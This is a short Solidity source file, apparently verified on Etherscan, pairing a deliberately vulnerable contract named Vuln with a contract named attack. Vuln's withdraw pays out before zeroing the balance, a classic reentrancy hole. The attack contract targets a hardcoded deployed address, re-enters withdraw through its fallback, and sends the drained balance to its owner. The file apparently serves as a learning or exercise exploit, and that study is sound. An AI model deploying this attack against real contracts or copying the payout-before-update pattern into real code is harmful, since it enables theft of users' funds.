/**
 *Submitted for verification at Etherscan.io on 2022-12-05
*/

pragma solidity ^0.6.0;

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract attack {

    Vuln vulnerable = Vuln(address(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d));
    address contractAddy;
    address owner;
    uint256 count = 0;
    constructor() public {
        owner = msg.sender;
        contractAddy = address(this);
    }
    fallback() external payable {
        if (count < 1) {
            count += 1;
            vulnerable.withdraw();
        }
    }
    function extract() public {
        if (msg.sender == owner) {
            require(msg.sender.send(contractAddy.balance));
        }
    }

    function deposit() payable public{
        vulnerable.deposit.value(msg.value)();
        vulnerable.withdraw();
    }
}